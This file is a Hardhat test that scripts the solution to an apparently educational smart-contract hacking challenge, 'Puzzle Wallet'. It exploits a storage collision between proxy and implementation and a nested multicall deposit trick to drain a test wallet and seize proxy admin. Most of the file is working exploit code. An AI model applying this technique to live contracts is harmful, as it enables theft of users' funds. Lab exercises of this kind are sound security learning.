const { expect } = require("chai");
require('chai')
    .use(require('chai-as-promised'))
    .should()

describe("Puzzle Wallet", function () {
  it("Should drain the wallet", async function () {

    const [owner, admin, user1, user2, hacker] = await ethers.getSigners();
    
    const PuzzleWallet = await ethers.getContractFactory("PuzzleWallet", owner);
    const PuzzleProxy = await ethers.getContractFactory("PuzzleProxy", owner);

    this.puzzleWallet = await PuzzleWallet.deploy();

    // create a PuzzleWallet interface with the functions we need to hack the wallet, this will become handy to deploy PuzzleProxy
    const wallet_interface = new ethers.utils.Interface(["function deposit()", "function init(uint256)", "function multicall(bytes[])"])
    // encode init function to deploy PuzzleProxy
    const init_encode = wallet_interface.encodeFunctionData("init", [ethers.utils.parseEther('10.0')]);
    // encode deposit function to pass it to multicall
    const deposit_encode = wallet_interface.encodeFunctionData("deposit", []);

    this.puzzleProxy = await PuzzleProxy.deploy(admin.address, this.puzzleWallet.address, init_encode);

    this.wallet = PuzzleWallet.attach(this.puzzleProxy.address);

    expect(await this.wallet.owner()).to.equal(owner.address);
    expect(await this.puzzleProxy.admin()).to.equal(admin.address);

    await this.wallet.addToWhitelist(user1.address);
    await this.wallet.addToWhitelist(user2.address);

    expect(await this.wallet.whitelisted(user1.address)).to.be.true;
    expect(await this.wallet.whitelisted(user2.address)).to.be.true;
    expect(await this.wallet.whitelisted(hacker.address)).to.be.false;
    
    await this.wallet.connect(user1).deposit({value: ethers.utils.parseEther('1.0')});
    await this.wallet.connect(user2).deposit({value: ethers.utils.parseEther('2.0')});
    await this.wallet.connect(hacker).deposit({value: ethers.utils.parseEther('0.1')}).should.be.rejected;

    // change the owner
    await this.puzzleProxy.connect(hacker).proposeNewAdmin(hacker.address);
    expect(await this.wallet.owner()).to.equal(hacker.address);

    // add to white list 
    expect(await this.wallet.whitelisted(hacker.address)).to.be.false;
    await this.wallet.connect(hacker).addToWhitelist(hacker.address);
    expect(await this.wallet.whitelisted(hacker.address)).to.be.true;

    // check total balance 
    console.log(`\nCurrent wallet Balance: ${ethers.utils.formatEther(await ethers.provider.getBalance(this.wallet.address))} ETH`)
    console.log(`Hacker balance before attack: ${ethers.utils.formatEther(await ethers.provider.getBalance(hacker.address))} ETH`);
    console.log(`Hacker balance inside wallet before attack: ${ethers.utils.formatEther(await this.wallet.balances(hacker.address))} ETH`);

    // deposit 0.5 ETH 6 times with just 0.5 ETH
    // encode multicall function, multicall only accepts array of bytes
    const multicall_encode = wallet_interface.encodeFunctionData("multicall", [[deposit_encode]]);
    await this.wallet.connect(hacker).multicall(Array(7).fill(multicall_encode), {value: ethers.utils.parseEther('0.5')});

    console.log(`\nHacker balance after attack: ${ethers.utils.formatEther(await ethers.provider.getBalance(hacker.address))} ETH`);
    console.log(`Hacker balance inside wallet after attack: ${ethers.utils.formatEther(await this.wallet.balances(hacker.address))} ETH`);

    const hacker_balance = await this.wallet.balances(hacker.address);

    // drain the entire wallet
    console.log('\nHacker draining all the ETH in the wallet...')
    await this.wallet.connect(hacker).execute(hacker.address, hacker_balance, []);

    expect(await ethers.provider.getBalance(this.wallet.address)).to.equal(0)
    console.log(`NEW Wallet Balance: ${ethers.utils.formatEther(await ethers.provider.getBalance(this.wallet.address))} ETH`);
    console.log(`NEW Hacker Balance: ${ethers.utils.formatEther(await ethers.provider.getBalance(hacker.address))} ETH`);

    // change the admin inside puzzleProxy
    await this.wallet.connect(hacker).setMaxBalance(hacker.address);
    expect(await this.puzzleProxy.admin()).to.equal(hacker.address);
  });
});
